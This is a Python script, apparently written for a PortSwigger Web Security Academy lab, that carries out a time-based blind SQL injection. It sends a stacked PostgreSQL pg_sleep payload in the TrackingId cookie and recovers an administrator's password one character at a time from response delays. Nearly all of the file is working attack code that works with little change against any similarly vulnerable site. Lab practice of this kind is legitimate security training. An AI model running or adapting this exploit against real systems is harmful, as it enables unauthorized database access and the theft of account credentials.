import requests
import string
import urllib3
import time

# Silence SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target lab URL
url = "https://0a5b00f7044dfc51aad2967900e90082.web-security-academy.net/filter?category=Lifestyle"

# Session cookie from your browser
session_cookie = "uVQFJCGvXZ9KNoJcPbulzYlRgrsnC7mJ"

# Characters to brute-force
charset = string.ascii_lowercase + string.digits

# Store extracted password
extracted_password = ""

# Delay between requests to avoid flooding (~100/min)
DELAY = 0.6

# Threshold to detect the 10-second delay
DELAY_THRESHOLD = 9  # seconds

# Password length (as confirmed in lab instructions)
PASSWORD_LENGTH = 20

# Loop through each position in the password
for position in range(1, PASSWORD_LENGTH + 1):
    found = False
    for ch in charset:
        # Build payload for this character at this position
        payload = (
            f"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{ch}')"
            f"+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        )

        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }

        try:
            start_time = time.time()
            response = requests.get(url, cookies=cookies, verify=False, timeout=15)
            elapsed = time.time() - start_time

            # If response takes ~10 seconds → correct character
            if elapsed >= DELAY_THRESHOLD:
                extracted_password += ch
                print(f"[+] Position {position}: Found character '{ch}' -> {extracted_password}")
                found = True
                break
            else:
                print(f"[-] Position {position}: '{ch}' is not correct (elapsed {elapsed:.2f}s)")

        except requests.exceptions.RequestException as e:
            print(f"[!] Request error at position {position}, char {ch}: {e}")
            continue

        # Throttle requests
        time.sleep(DELAY)

    if not found:
        print(f"[-] Could not determine character at position {position}")
        break

print(f"\n[!] Extracted administrator password: {extracted_password}")
